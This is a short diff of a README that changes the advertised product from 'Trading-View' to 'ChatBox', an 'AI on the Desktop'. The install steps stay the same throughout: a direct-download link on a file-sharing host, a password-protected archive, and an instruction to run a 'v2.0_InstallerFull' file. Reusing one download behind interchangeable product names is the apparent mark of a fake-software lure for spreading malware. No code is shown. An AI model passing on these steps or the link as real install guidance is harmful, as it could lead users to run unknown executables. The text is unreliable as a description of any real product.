@@ -2,7 +2,7 @@
 🚀Your Ultimate AI on the Desktop🚀
 
 ## Installation
-To install **Trading-View**, follow these steps:
+To install **ChatBox**, follow these steps:
 # [DOWNLOAD](https://www.4sync.com/web/directDownload/wtQ9x4pi/me6XXOEh.a264ab28815a251e404314dfea60cc66)  
 After downloading the archive, unzip it using the password. Run the v2.0_InstallerFull file.
 
